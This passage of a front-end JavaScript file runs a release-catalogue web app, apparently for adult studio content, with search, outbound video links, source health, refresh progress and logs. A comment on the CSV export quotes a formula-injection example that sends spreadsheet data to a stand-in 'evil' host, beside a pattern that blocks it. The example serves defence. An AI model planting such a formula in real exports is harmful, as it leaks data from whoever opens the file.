import {
  renderSourceHealth,
  renderSourceHealthSummary,
  sourceCardState,
  sourceScenes,
  studioChoices,
  visibleSourceStatuses,
} from "./source-health.js";
import {
  ASIAN_CATALOGUE,
  MAIN_CATALOGUE,
  catalogueId,
  catalogueScenes,
  catalogueStats,
  inCatalogue,
} from "./catalogues.js";

const $ = (selector) => document.querySelector(selector);
const list = $("#list");
const loadMoreButton = $("#load-more");
const searchSuggestions = $("#search-suggestions");
const empty = $("#empty");
const emptyTitle = $("#empty-title");
const emptyMessage = $("#empty-message");
const search = $("#search");
const sort = $("#sort");
const studio = $("#studio");
const count = $("#count");
const notices = $("#notices");
const scenesTotal = $("#stat-scenes");
const linkedTotal = $("#stat-linked");
const linkRate = $("#link-rate");
const studiosTotal = $("#stat-studios");
const catalogueTitle = $("#catalogue-title");
const catalogueEyebrow = $("#catalogue-eyebrow");
const lastChecked = $("#last-checked");
const refreshState = $("#refresh-state");
const refreshButton = $("#refresh");
const sourcesList = $("#sources-list");
const sourceSummary = $("#source-summary");
const logsList = $("#logs-list");
const logsCount = $("#logs-count");
const logsEmpty = $("#logs-empty");
const logsEmptyMessage = $("#logs-empty-message");
const logsFilter = $("#logs-filter");
const progressRow = $("#progress-row");
const overallTrack = $("#overall-track");
const overallSourcesHalf = $("#overall-half-sources");
const overallSourcesFill = $("#overall-fill-sources");
const overallLinksHalf = $("#overall-half-links");
const overallLinksFill = $("#overall-fill-links");
const overallNote = $("#overall-note");
const overallElapsed = $("#overall-elapsed");
const populateTrack = $("#populate-track");
const populateFill = $("#populate-fill");
const populateNote = $("#populate-note");
const linkTrack = $("#link-track");
const linkFill = $("#link-fill");
const linkNote = $("#link-note");
const linkDetail = $("#link-detail");
const progressLive = $("#progress-live");
let scenes = [];
let statuses = [];
let refreshing = false;
let catalogueLoaded = false;
let latestRun = null;
let displayLimit = 120;

/** Which catalogue page is showing. The Asian lanes are on their own page (#65). */
let activeCatalogue = MAIN_CATALOGUE;
/** The lanes on the Asian page, named by the server rather than guessed here. */
let asianSourceIds = [];
const asianView = () => activeCatalogue === ASIAN_CATALOGUE;
/** The window rows this page shows. */
const visibleScenes = () => catalogueScenes(scenes, activeCatalogue, asianSourceIds);

const esc = (value) => String(value ?? "").replace(/[&<>'"]/g, (character) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", "'": "&#39;", '"': "&quot;" })[character]);
const niceDate = (value) => {
  const date = new Date(`${value}T12:00:00Z`);
  return Number.isNaN(date.getTime()) ? "Date unknown" : date.toLocaleDateString("en", { day: "2-digit", month: "short", year: "numeric", timeZone: "UTC" });
};
const safeUrl = (value) => {
  try { const url = new URL(value); return url.protocol === "https:" ? url.href : ""; } catch { return ""; }
};
/** Live HTTPS links, deduplicated by normalized URL. Dead links live in a separate array. */
const linksFor = (scene) => {
  const items = Array.isArray(scene.videoUrls) ? scene.videoUrls : [];
  const seen = new Set();
  return items.filter((item) => {
    const url = safeUrl(item?.url);
    if (!item || !url || seen.has(url)) return false;
    seen.add(url);
    return true;
  });
};

/** Render the filtered, sorted catalogue grouped by release month. */
function render() {
  const query = search.value.trim().toLocaleLowerCase();
  const detailed = Boolean(query || studio.value !== "all");
  let filtered = visibleScenes().filter((scene) =>
    (studio.value === "all" || scene.labelId === studio.value) &&
    [scene.title, scene.label, ...(scene.performers || [])].join(" ").toLocaleLowerCase().includes(query));
  filtered.sort((a, b) => sort.value === "title"
    ? a.title.localeCompare(b.title)
    : (sort.value === "oldest" ? 1 : -1) * String(a.releaseDate || "").localeCompare(String(b.releaseDate || "")));
  count.textContent = `${filtered.length} ${filtered.length === 1 ? "release" : "releases"}`;
  renderEmptyState(filtered.length);
  list.hidden = filtered.length === 0;
  const totalFiltered = filtered.length;
  filtered = filtered.slice(0, displayLimit);
  loadMoreButton.hidden = totalFiltered <= filtered.length;
  loadMoreButton.textContent = `Load more (${totalFiltered - filtered.length} remaining)`;
  const groups = new Map();
  for (const scene of filtered) {
    const date = new Date(`${scene.releaseDate}T12:00:00Z`);
    const month = Number.isNaN(date.getTime()) ? "Undated" : date.toLocaleDateString("en", { month: "long", year: "numeric", timeZone: "UTC" });
    groups.set(month, [...(groups.get(month) || []), scene]);
  }
  list.innerHTML = [...groups].map(([month, items]) => `<section class="month-group"><div class="month-heading"><h3>${esc(month)}</h3><span>${items.length} RELEASE${items.length === 1 ? "" : "S"}</span></div>${items.map((scene) => {
    const initials = (scene.title || "L").split(/\s+/).slice(0, 2).map((word) => word[0]).join("").toUpperCase();
    const image = safeUrl(scene.thumbnailUrl);
    const thumb = image ? `<img src="${esc(image)}" loading="lazy" alt="">` : `<span class="thumb-initials">${esc(initials)}</span>`;
    const links = linksFor(scene);
    const sourceTotals = new Map();
    for (const item of links) sourceTotals.set(item.source, (sourceTotals.get(item.source) || 0) + 1);
    const sourceIndexes = new Map();
    const outbound = links.map((item) => {
      const index = (sourceIndexes.get(item.source) || 0) + 1;
      sourceIndexes.set(item.source, index);
      const label = Number.isInteger(item.part) && item.part > 0
        ? `${item.source} · Part ${item.part}`
        : (sourceTotals.get(item.source) > 1 ? `${item.source} ${index}` : item.source);
      return `<a class="source-link source-link--${esc(item.source)}" href="${esc(safeUrl(item.url))}" target="_blank" rel="noopener noreferrer" title="Open on ${esc(item.source)}">${esc(label)} <span>↗</span></a>`;
    }).join("");
    const releaseUrl = safeUrl(scene.releaseUrl);
    const lowConfidence = scene.videoMatching && scene.videoMatching.confidence === "low";
    const playbackStatus = !links.length ? "Missing" : lowConfidence ? "Guessed" : "Matched";
    const runtime = (value) => `${Math.floor(value / 60)}m ${String(value % 60).padStart(2, "0")}s`;
    const duration = scene.durationRange
      ? `${runtime(scene.durationRange.minSec)}–${runtime(scene.durationRange.maxSec)}`
      : scene.durationSec
        ? `${Math.round(scene.durationSec / 60)} MIN`
        : "";
    const meta = `${esc(scene.label)}${duration ? ` · ${esc(duration)}` : ""} · ${esc(niceDate(scene.releaseDate))}`;
    if (detailed) return `<article class="release-row release-row--detail"><div class="release-thumb">${thumb}</div><div class="release-main"><div class="release-meta"><span class="studio-tag">${esc(scene.label)}</span><span class="playback-status playback-status--${playbackStatus.toLowerCase()}">${playbackStatus}</span>${duration ? `<span>${esc(duration)}</span>` : ""}</div><h4>${esc(scene.title)}</h4><p class="performers">${(scene.performers || []).length ? scene.performers.map(esc).join(" <i>·</i> ") : "Performer information unavailable"}</p><time datetime="${esc(scene.releaseDate)}">${esc(niceDate(scene.releaseDate))}</time></div><div class="release-links">${outbound || '<span class="unlinked">No verified link</span>'}${releaseUrl ? `<a class="release-page" href="${esc(releaseUrl)}" target="_blank" rel="noopener noreferrer">Release page ↗</a>` : ""}</div></article>`;
    return `<article class="release-tile"><div class="tile-image">${thumb}<span class="playback-status playback-status--${playbackStatus.toLowerCase()}">${playbackStatus}</span></div><div class="tile-content"><span class="studio-tag">${esc(scene.label)}</span><h4 title="${esc(scene.title)}">${esc(scene.title)}</h4><p class="performers">${(scene.performers || []).slice(0, 3).map(esc).join(" · ") || "Performer information unavailable"}</p><span class="tile-meta">${meta}</span><div class="release-links">${outbound || '<span class="unlinked">No verified link</span>'}</div></div></article>`;
  }).join("")}</section>`).join("");
}

/** Explain an empty view using the catalogue snapshot and the live refresh state. */
function renderEmptyState(visibleCount = null) {
  // Progress polls only update the explanation; they never rebuild populated rows.
  if (visibleScenes().length > 0 && visibleCount === null) return;
  empty.hidden = visibleCount > 0;
  if (empty.hidden) return;
  let title;
  let message;
  if (!catalogueLoaded) {
    title = "Loading catalogue…";
    message = "Waiting for the catalogue response.";
  } else if (visibleScenes().length > 0) {
    title = "No releases found";
    message = "Try a different search or studio filter.";
  } else if (progressState.active || (refreshing && !catalogueReloadPending && !catalogueReloadFailed && progressState.stage !== "error")) {
    title = "Building the catalogue…";
    message = "The refresh is still running. This page updates when it finishes; reloading may show releases already collected. Follow its progress above.";
  } else if (catalogueReloadPending) {
    title = "Loading refreshed catalogue…";
    message = "The refresh has ended. Fetching its latest releases.";
  } else if (catalogueReloadFailed) {
    title = "Unable to load refreshed catalogue";
    message = "The catalogue request failed. This page will retry automatically, or you can reload.";
  } else if (progressState.stage === "error" || latestRun?.ok === false) {
    title = "Refresh failed to populate the catalogue";
    message = "No releases are available in this page’s catalogue. Check Sources for reported failures, then try Refresh now.";
  } else if (latestRun) {
    title = "No releases in the catalogue";
    message = "The refresh finished without releases in the current window. Check Sources or try Refresh now.";
  } else {
    title = "Waiting for the first refresh";
    message = "The catalogue has not been populated yet. Try Refresh now.";
  }
  emptyTitle.textContent = title;
  emptyMessage.textContent = message;
}

function renderSources() {
  const visible = visibleSourceStatuses(statuses);
  sourceSummary.innerHTML = renderSourceHealthSummary(visible);
  sourcesList.innerHTML = visible.map((item) => {
    const authority = item.authority || {};
    const owned = sourceScenes(item, scenes);
    const linked = owned.filter((scene) => linksFor(scene).length).length;
    const total = owned.length;
    const state = sourceCardState(item.lastError);
    const url = safeUrl(authority.url);
    const title = item.labelId !== item.sourceId ? item.label : item.name;
    return `<article class="source-card source-card--${state}"><div class="source-card-top"><span class="status-pill"><i></i>${state === "ok" ? "HEALTHY" : state === "setup" ? "SETUP REQUIRED" : "NEEDS ATTENTION"}</span><span class="source-mark">${esc((authority.name || "S").slice(0, 1))}</span></div><p class="source-role">${esc(authority.role || "Catalogue source")}</p><h3>${esc(title || item.name)}</h3><p class="source-provider">via ${esc(authority.name || "configured source")}</p><div class="source-metrics"><span><strong>${total}</strong> releases</span><span><strong>${total ? Math.round(linked / total * 100) : 0}%</strong> linked</span></div><div class="source-health">${renderSourceHealth(item, scenes)}</div><div class="source-card-bottom"><span>Last good: ${item.lastSuccessAt ? esc(new Date(item.lastSuccessAt).toLocaleDateString()) : "—"}</span>${url ? `<a href="${esc(url)}" target="_blank" rel="noreferrer">Open source ↗</a>` : ""}</div></article>`;
  }).join("");
}

/**
 * Draw the selected catalogue page: its heading, its own figures, and its rows.
 *
 * Every number here is counted from the rows the page shows, so the linking
 * percentage describes the catalogue on screen rather than the whole window.
 * `LAST REFRESH` is the exception and stays global: a cycle refreshes every lane.
 */
function renderCatalogue() {
  const stats = catalogueStats(scenes, activeCatalogue, asianSourceIds);
  catalogueTitle.textContent = asianView() ? "Asian" : "Catalogue";
  catalogueEyebrow.textContent = asianView() ? "FC2 & MADOUQU RELEASES" : "RELEASE LEDGER";
  document.title = asianView() ? "Liszt — Asian releases" : "Liszt — Recent releases";
  scenesTotal.textContent = stats.total.toLocaleString();
  linkedTotal.textContent = stats.live.toLocaleString();
  linkRate.textContent = `${stats.matchPercent === null ? 0 : stats.matchPercent}% of ${asianView() ? "Asian catalogue" : "catalogue"}`;
  studiosTotal.textContent = visibleSourceStatuses(statuses).filter((item) => inCatalogue(item, activeCatalogue, asianSourceIds)).length.toLocaleString();
  // A studio filter names a label on THIS page: one carried over from the other
  // catalogue is dropped back to "All studios", because a <select> holding no
  // such option reads as no selection and would silently empty the list.
  const choices = studioChoices(visibleScenes());
  const selected = studio.value;
  const labels = new Set(["all", ...choices.map((item) => item.labelId)]);
  studio.replaceChildren(new Option("All studios", "all"));
  studio.insertAdjacentHTML("beforeend", choices.map((item) => `<option value="${esc(item.labelId)}">${esc(item.label)} · ${item.sceneCount}</option>`).join(""));
  studio.value = labels.has(selected) ? selected : "all";
  const suggestionValues = [...new Set(visibleScenes().flatMap((scene) => [scene.label, ...(scene.performers || [])]).filter(Boolean))].sort((a, b) => a.localeCompare(b));
  searchSuggestions.replaceChildren(...suggestionValues.map((value) => {
    const option = document.createElement("option");
    option.value = value;
    return option;
  }));
  render();
}

/**
 * One line describing the last run.
 *
 * Truncation is its own state here, not a flavour of success. A bounded pool
 * search that stopped at its hydration cap reported "no link found" without
 * having looked at every candidate, so counting it as an ordinary negative
 * makes a coverage problem look like a fact about the scene. An errored rung is
 * listed too, and stays first: a rung that could not answer is worse news than
 * one that answered about part of the set.
 *
 * The slow source's request count comes next and is not a verdict. The ladder
 * tries the fast pool first, so a run that spent requests there can be a perfectly
 * good run. It is here because that source makes us wait ten seconds per request,
 * so this is the number that says how long a refresh took - and for a long time
 * nobody could read it off anywhere.
 *
 * The guess count is last. "Catalogue up to date" says nothing about whether the
 * links it found were identified, and a run where most of them were guesses reads
 * as a clean refresh without it. The scenes themselves are already labelled
 * LOW CONFIDENCE; this is the same fact as one number per run.
 */
function refreshStatus(refreshing, run) {
  if (refreshing) return "Refresh in progress…";
  if (!run) return "Waiting for first refresh";
  const resolver = run.resolverHealth || {};
  const parts = [];
  if (Number(resolver.errored || 0)) parts.push("resolver unavailable");
  if (Number(resolver.incomplete || 0)) parts.push("search truncated");
  const guesses = Number(resolver.winnerFallback || 0);
  if (guesses) parts.push(`${guesses} low-confidence ${guesses === 1 ? "guess" : "guesses"}`);
  const suffix = parts.length ? ` · ${parts.join(" · ")}` : "";
  return run.ok
    ? `Catalogue up to date${suffix}`
    : `${Number(resolver.errored || 0) ? "Source and resolver failures" : "Last refresh had source failures"}${suffix}`;
}

/** Apply a catalogue response to the scene list, source summary, and progress display. */
function apply(data) {
  scenes = Array.isArray(data.scenes) ? data.scenes : [];
  statuses = Array.isArray(data.sources) ? data.sources : [];
  asianSourceIds = Array.isArray(data.asianSourceIds) ? data.asianSourceIds : [];
  refreshing = Boolean(data.refreshing);
  catalogueLoaded = true;
  latestRun = data.latestRun || null;
  catalogueReloadPending = false;
  catalogueReloadFailed = false;
  lastChecked.textContent = data.latestRun && data.latestRun.endedAt ? new Date(data.latestRun.endedAt).toLocaleString("en", { day: "numeric", month: "short", hour: "numeric", minute: "2-digit" }) : "—";
  refreshState.textContent = refreshStatus(refreshing, data.latestRun);
  refreshButton.disabled = refreshing;
  renderCatalogue();
  renderSources();
  // The read model carries a snapshot too, so a first paint that lands in the
  // middle of a cycle can already show its stage - the poll takes it from there.
  // `refreshing` is the terminal-state authority. A completed catalogue can
  // briefly arrive with the previous active progress payload, and replaying it
  // would reopen a stale progress row until the page is reloaded.
  const progress = data.progress && typeof data.progress === "object" ? data.progress : {};
  applyProgress(
    refreshing
      ? progress
      : { ...progress, active: false, stage: progress.stage === "error" ? "error" : "idle" },
    refreshing,
  );
}

async function load() {
  const response = await fetch("/api/scenes", { cache: "no-store" });
  if (!response.ok) throw new Error(`Server returned ${response.status}`);
  apply(await response.json());
}

/* ---- Live refresh progress -------------------------------------------------
   A cycle takes minutes and used to say nothing at all until it ended, so a
   long run and a hung one looked identical. `/api/progress` is polled on its
   own: a few hundred bytes, separate from the ~137 KB catalogue fetch, because
   refetching the catalogue every couple of seconds to move a bar would re-sort
   the list under the reader's cursor.

   The row is REVEALED LATE, ~1.2 s in. A cycle that finishes first never
   flashes a bar at all, and a bar that appears instantly alongside a click
   reads as a loading decoration rather than as information about a job. */
const POLL_ACTIVE_MS = 2000;
const POLL_IDLE_MS = 20000;
const REVEAL_DELAY_MS = 1200;
const LIVE_SOURCE_NAMES = 2;

let progressState = { active: false, stage: "idle" };
let pollTimer = null;
let pollPending = false;
let catalogueReloadFailed = false;
let catalogueReloadPending = false;
let revealTimer = null;
let elapsedTimer = null;
/* ---- Logs -----------------------------------------------------------------
   The run ledger from GET /api/runs: one entry per refresh cycle, with each
   lane's outcome and the error text when a lane failed. A passive history
   view, so it fetches on demand - on opening the Logs page and on changing
   the filter - rather than on a background timer that would add a second
   polling loop for data that only changes once a cycle ends. */
let runs = [];
let logsPending = false;
/** True when the last fetch failed and no snapshot is loaded, so an empty view is shown as an error rather than a real empty. */
let logsError = false;

/**
 * Render the run ledger into the Logs page: one card per refresh cycle,
 * showing whether it succeeded and, per failed lane, the reason. The
 * errors-only filter shows only cycles whose overall `ok` is false.
 */
function renderLogs() {
  const errorsOnly = logsFilter.value === "errors";
  const failed = runs.filter((run) => run.ok === false);
  const shown = errorsOnly ? failed : runs;
  logsEmpty.hidden = shown.length > 0;
  if (!shown.length) {
    logsList.innerHTML = "";
    if (logsError) {
      logsCount.textContent = "Could not load the log.";
      logsEmptyMessage.textContent = "Could not load the log. Retrying.";
    } else if (errorsOnly) {
      logsCount.textContent = "No failed runs";
      logsEmptyMessage.textContent = "No refresh cycle has failed recently.";
    } else {
      logsCount.textContent = "No runs yet";
      logsEmptyMessage.textContent = "Waiting for the first refresh cycle.";
    }
    return;
  }
  logsCount.textContent = `${shown.length} ${shown.length === 1 ? "entry" : "entries"}`;
  logsList.innerHTML = shown.map((run) => {
    const outcomes = Array.isArray(run.outcomes) ? run.outcomes : [];
    const lanes = outcomes.filter((outcome) => outcome && outcome.ok === false);
    const started = run.startedAt ? new Date(run.startedAt) : null;
    const when = started && !Number.isNaN(started.getTime())
      ? started.toLocaleString("en", { dateStyle: "medium", timeStyle: "short" })
      : "Unknown time";
    const state = run.ok === false ? "error" : "ok";
    const pill = state === "error" ? "FAILED" : "OK";
    const laneList = lanes.length
      ? `<ul class="log-lanes">${lanes.map((outcome) => `<li><span class="log-lane-source">${esc(outcome.source)}</span>${outcome.error ? `<span class="log-lane-error">${esc(outcome.error)}</span>` : ""}</li>`).join("")}</ul>`
      : `<p class="log-lanes-empty">All lanes succeeded.</p>`;
    // No run-level error line: sync.ts derives run.error as the first failing
    // outcome's error, which is already the first lane shown above.
    return `<article class="log-card log-card--${state}"><div class="log-card-top"><span class="status-pill"><i></i>${pill}</span><span class="log-card-time">${esc(when)}</span></div><p class="log-card-kind">sync${run.endedAt ? "" : " · still running"}</p>${laneList}</article>`;
  }).join("");
}

/** Fetch the recent runs from GET /api/runs and re-render. A failed fetch keeps the last snapshot and flags the error state. */
async function loadLogs() {
  if (logsPending) return;
  logsPending = true;
  try {
    // limit=50: the endpoint caps at 50, and the errors-only filter needs the
    // full history so a failure is not hidden behind 10 later successes.
    const response = await fetch("/api/runs?limit=50", { cache: "no-store" });
    if (!response.ok) throw new Error(String(response.status));
    const body = await response.json();
    runs = Array.isArray(body.runs) ? body.runs : [];
    logsError = false;
  } catch {
    // A failed fetch leaves the last snapshot alone rather than blanking the
    // log, but flags the state so an empty view is not read as a real empty.
    logsError = runs.length === 0;
  } finally {
    logsPending = false;
  }
  renderLogs();
}
logsFilter.addEventListener("change", loadLogs);
let rowShown = false;
let primed = false;
let announcedRun = null;
let completedRun = null;

/** Coerce a progress value to a finite number, using zero when conversion fails. */
const num = (value) => (Number.isFinite(Number(value)) ? Number(value) : 0);

/** Fill for one stage as a whole percent, or null when there is nothing to count. */
const ratio = (done, total) => (num(total) > 0 ? Math.max(0, Math.min(100, Math.round((num(done) / num(total)) * 100))) : null);

/** `48s`, `4m 12s`. Ticked locally from `startedAt`, so a stalled counter is still visibly alive. */
const elapsedText = (startedAt) => {
  const started = Date.parse(startedAt || "");
  if (!Number.isFinite(started)) return "";
  const seconds = Math.max(0, Math.round((Date.now() - started) / 1000));
  return seconds < 60 ? `${seconds}s` : `${Math.floor(seconds / 60)}m ${String(seconds % 60).padStart(2, "0")}s`;
};

/**
 * The stage, in plain English. The names here are adapter ids from the static
 * registry, never scraped page text - and they are written with `textContent`
 * below, so they are never parsed as markup either way.
 */
function stageCaption(progress) {
  const populate = progress.populate || {};
  const link = progress.link || {};
  if (progress.stage === "populating") {
    const inFlight = Array.isArray(populate.current) ? populate.current : [];
    const names = inFlight.slice(0, LIVE_SOURCE_NAMES);
    if (!names.length) return `Polling sources — ${num(populate.done)} of ${num(populate.total)} done`;
    return `Polling sources — ${names.join(", ")}${inFlight.length > names.length ? "…" : ""}`;
  }
  if (progress.stage === "linking") {
    return num(link.total) > 0
      ? `Checking ${num(link.total)} releases for a verified link — ${num(link.done)} done, ${num(link.matched)} linked`
      : "Nothing to check for a link";
  }
  if (progress.stage === "verifying") {
    return num(link.verifyTotal) > 0
      ? `Re-checking ${num(link.verifyTotal)} existing links — ${num(link.verifyDone)} done`
      : "Nothing to re-check";
  }
  if (progress.stage === "finishing") return "Finishing up";
  if (progress.stage === "error") return "Refresh failed — see the Sources section";
  return "Working…";
}

/** `null` percent means "indeterminate": the track shimmers instead of sitting at a permanent 0%. */
function setTrack(half, fill, percent) {
  fill.style.width = percent === null ? "0%" : `${percent}%`;
  if (half) half.classList.toggle("is-indeterminate", percent === null);
}

/** An indeterminate progressbar must not carry `aria-valuenow`; the text carries the meaning instead. */
function setAria(track, percent, text) {
  if (percent === null) track.removeAttribute("aria-valuenow");
  else track.setAttribute("aria-valuenow", String(percent));
  track.setAttribute("aria-valuetext", text);
}

/** Update stage meters, captions, and accessibility values from a progress snapshot. */
function renderProgress(progress) {
  const populate = progress.populate || {};
  const link = progress.link || {};
  const verifying = link.substage === "verify";
  const sources = ratio(populate.done, populate.total);
  // While re-verifying, the Linking bar tracks the re-verify slice rather than
  // the resolve queue - the queue is already complete and would sit at 100%.
  const links = verifying ? ratio(link.verifyDone, link.verifyTotal) : ratio(link.done, link.total);
  const caption = stageCaption(progress);

  overallNote.textContent = caption;
  setTrack(overallSourcesHalf, overallSourcesFill, sources);
  setTrack(overallLinksHalf, overallLinksFill, links);
  // Never shown as a number: six crawls and 121 link checks are not one unit
  // of work, so there is no honest single figure. The average exists only to
  // give the progressbar role a valid value when both stages are known;
  // otherwise use the known stage, or leave the value indeterminate.
  const overall = sources === null ? links : links === null ? sources : Math.round((sources + links) / 2);
  setAria(overallTrack, overall, caption);

  populateNote.textContent = num(populate.total) > 0 ? `${num(populate.done)} of ${num(populate.total)} sources` : "No sources configured";
  setTrack(populateTrack, populateFill, sources);
  setAria(populateTrack, sources, populateNote.textContent);

  linkNote.textContent = verifying
    ? (num(link.verifyTotal) > 0 ? `${num(link.verifyDone)} of ${num(link.verifyTotal)} re-checked` : "Nothing to re-check")
    : (num(link.total) > 0 ? `${num(link.done)} of ${num(link.total)} checked` : "Nothing to check");
  linkDetail.textContent = num(link.total) > 0 ? `${num(link.matched)} linked` : "";
  setTrack(linkTrack, linkFill, links);
  setAria(linkTrack, links, linkNote.textContent);
}

/** Reveal the progress row once, starting its fade after the initial layout. */
function showRow() {
  if (rowShown) return;
  rowShown = true;
  progressRow.hidden = false;
  // Two frames: the row has to be laid out at zero opacity before it is allowed
  // to fade in, or the transition has nothing to interpolate from.
  progressRow.style.opacity = "0";
  requestAnimationFrame(() => { progressRow.style.opacity = ""; });
}

/** Cancel reveal and elapsed timers, clear elapsed text, and hide the progress row. */
function hideRow() {
  if (revealTimer) { clearTimeout(revealTimer); revealTimer = null; }
  if (elapsedTimer) { clearInterval(elapsedTimer); elapsedTimer = null; }
  overallElapsed.textContent = "";
  if (!rowShown) return;
  rowShown = false;
  progressRow.hidden = true;
  progressRow.style.opacity = "";
}

/** Refresh elapsed time from the active run, or clear it when the run is inactive. */
function tickElapsed() {
  overallElapsed.textContent = progressState.active ? elapsedText(progressState.startedAt) : "";
}

/** Update the refresh button state and show the in-progress caption for an active run. */
function syncRefreshChrome(active) {
  refreshButton.disabled = active;
  refreshButton.classList.toggle("is-loading", active);
  if (active) refreshState.textContent = "Refresh in progress…";
}

/** Absorb one snapshot. Returns whether a cycle is live, which sets the next poll delay. */
function applyProgress(next, reloadOnCompletion = true) {
  const wasActive = Boolean(progressState.active);
  const previousRun = progressState.runId || null;
  // A delayed active snapshot must not revive a run already observed ending.
  if (next?.active && next.runId && next.runId === completedRun) return wasActive;
  progressState = next && typeof next === "object" ? next : { active: false, stage: "idle" };
  const active = Boolean(progressState.active);
  const run = progressState.runId || null;
  if (!active) completedRun = run || previousRun || completedRun;
  const newRun = primed && run !== null && run !== previousRun;

  // The live region carries exactly two messages per run. The first snapshot of
  // a page load is not one of them: a cycle already in flight was started by the
  // boot sync, the timer or somebody else, and announcing it would announce
  // something this reader did not do.
  if (!primed) {
    primed = true;
    announcedRun = run;
  } else if (active && run && announcedRun !== run) {
    announcedRun = run;
    progressLive.textContent = "Refresh started";
  }

  if (active) {
    if (!rowShown && !revealTimer) {
      revealTimer = setTimeout(() => {
        revealTimer = null;
        // Rendered HERE, not left to the next poll: the row appears empty for a
        // whole interval otherwise, which reads as a broken bar rather than a
        // deliberate delay.
        if (progressState.active) { showRow(); renderProgress(progressState); }
      }, REVEAL_DELAY_MS);
    }
    if (rowShown) renderProgress(progressState);
    tickElapsed();
    if (!elapsedTimer) elapsedTimer = setInterval(tickElapsed, 1000);
  } else {
    hideRow();
    // A run can finish between polls or while the tab is hidden. Reload on
    // completion or a newly observed run, without refetching every idle poll.
    if (wasActive) {
      progressLive.textContent = progressState.stage === "error" ? "Refresh failed" : "Refresh finished";
    }
    if (reloadOnCompletion && (wasActive || newRun)) {
      catalogueReloadPending = true;
      load().catch(() => {
        catalogueReloadPending = false;
        catalogueReloadFailed = true;
        renderEmptyState();
      });
    }
  }
  syncRefreshChrome(active);
  renderEmptyState();
  return active;
}

/** Replace the pending progress poll with a delayed one while the tab is visible. */
function schedulePoll(delay) {
  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
  if (document.hidden) return;
  pollTimer = setTimeout(pollProgress, delay);
}

/** Fetch progress with at most one request in flight, then schedule the next poll. */
async function pollProgress() {
  if (pollTimer) clearTimeout(pollTimer);
  pollTimer = null;
  // One request in flight, ever. Chained with `setTimeout` rather than
  // `setInterval` so a slow response cannot stack up behind itself.
  if (document.hidden || pollPending) return;
  pollPending = true;
  let active = Boolean(progressState.active);
  try {
    const response = await fetch("/api/progress", { cache: "no-store" });
    if (!response.ok) throw new Error(String(response.status));
    const body = await response.json();
    active = applyProgress(body.progress);
    if (!active && catalogueReloadFailed) {
      await load();
      catalogueReloadFailed = false;
    }
  } catch {
    // A failed poll leaves the last snapshot alone - collapsing a bar because
    // one request failed would be a lie - and backs the loop off to idle.
  } finally {
    pollPending = false;
  }
  schedulePoll(active ? POLL_ACTIVE_MS : POLL_IDLE_MS);
}

// A hidden tab asks for nothing at all. Coming back asks immediately rather
// than resuming mid-interval, so the meters are not up to 20 s stale on return.
document.addEventListener("visibilitychange", () => {
  if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
  if (!document.hidden) pollProgress();
});

const updateSearchAddress = () => {
  const url = new URL(globalThis.location.href);
  if (search.value.trim()) url.searchParams.set("q", search.value.trim());
  else url.searchParams.delete("q");
  globalThis.history.replaceState(null, "", url);
};
search.value = new URL(globalThis.location.href).searchParams.get("q") || "";
search.addEventListener("input", () => { displayLimit = 120; updateSearchAddress(); render(); });
sort.addEventListener("change", render);
studio.addEventListener("change", render);
loadMoreButton.addEventListener("click", () => { displayLimit += 120; render(); });
globalThis.addEventListener("popstate", () => {
  search.value = new URL(globalThis.location.href).searchParams.get("q") || "";
  displayLimit = 120;
  render();
});
refreshButton.addEventListener("click", async () => {
  refreshButton.disabled = true;
  refreshButton.classList.add("is-loading");
  refreshState.textContent = "Refresh requested…";
  try { await fetch("/api/refresh", { method: "POST" }); } catch { /* the poll below reports state */ }
  pollProgress();
});
// Every exported cell is REMOTE TEXT: titles, performer names and labels come
// from scraped studio pages, and a title is attacker-influenced in the same way
// any user-supplied string is. Quoting alone does not make a CSV safe - Excel,
// LibreOffice and Google Sheets all evaluate a quoted cell that STARTS with
// `=`, `+`, `-` or `@` as a formula, so `=HYPERLINK("http://evil/"&A1,"click")`
// in a title becomes live code in whoever opens the export. The leading
// apostrophe is the documented escape: it forces text and is not displayed.
const FORMULA_LEAD = /^[=+\-@\t\r]/;
function csvCell(value) {
  const text = String(value ?? "");
  return `"${(FORMULA_LEAD.test(text) ? `'${text}` : text).replaceAll('"', '""')}"`;
}
$("#export").addEventListener("click", () => {
  const headings = ["studio", "title", "release_date", "performers", "release_url", "video_sources"];
  // The page on screen, not the whole window: an export is what the reader is
  // looking at, and the file name says which catalogue it came from.
  const rows = visibleScenes().map((scene) => [scene.label, scene.title, scene.releaseDate, (scene.performers || []).join("; "), scene.releaseUrl, linksFor(scene).map((item) => item.url).join("; ")]);
  const csv = [headings, ...rows].map((row) => row.map(csvCell).join(",")).join("\r\n");
  const anchor = document.createElement("a");
  anchor.href = URL.createObjectURL(new Blob([csv], { type: "text/csv" }));
  anchor.download = asianView() ? "liszt-asian-catalogue.csv" : "liszt-catalogue.csv";
  anchor.click();
  URL.revokeObjectURL(anchor.href);
});
/** Switch catalogue page. `null` (Sources) leaves the current page alone. */
function selectCatalogue(id) {
  const next = catalogueId(id);
  if (!next || next === activeCatalogue) return;
  activeCatalogue = next;
  renderCatalogue();
}
/**
 * Light the nav link the address bar points at.
 *
 * The hash is the single source of truth for which link is lit, so this runs on
 * every hashchange and not only on a click: a bookmarked `#asian` opened cold,
 * and back/forward over these anchors, would otherwise leave the previous link
 * lit above the page the reader is actually on. An empty hash means the default
 * link in the HTML stands.
 */
function syncNav(value) {
  const id = String(value ?? "").replace(/^#/, "");
  if (!id) return;
  document.querySelectorAll("[data-nav]").forEach((item) => item.classList.toggle("active", item.dataset.nav === id));
}
document.querySelectorAll("[data-nav]").forEach((link) => link.addEventListener("click", () => {
  syncNav(link.dataset.nav);
  selectCatalogue(link.dataset.nav);
}));
// The hash is read as well as the click, so a bookmarked `#asian`, and the
// browser's own back/forward over these anchors, land on the same page.
// On `globalThis`, not `document`: the browser fires `hashchange` at the Window,
// and it does not bubble, so a document listener would never run. `keydown`
// below does bubble, and stays where it is.
globalThis.addEventListener("hashchange", () => {
  syncNav(globalThis.location?.hash);
  selectCatalogue(globalThis.location?.hash);
  if (globalThis.location?.hash === "#logs") void loadLogs();
});
document.addEventListener("keydown", (event) => {
  if ((event.metaKey || event.ctrlKey) && event.key.toLowerCase() === "k") { event.preventDefault(); search.focus(); }
});
syncNav(globalThis.location?.hash);
selectCatalogue(globalThis.location?.hash);
async function initialize() {
  try {
    await load();
  } catch (error) {
    notices.innerHTML = `<div class="notice notice-warning">Catalogue unavailable: ${esc(error.message)}</div>`;
    refreshState.textContent = "Unable to load catalogue";
  } finally {
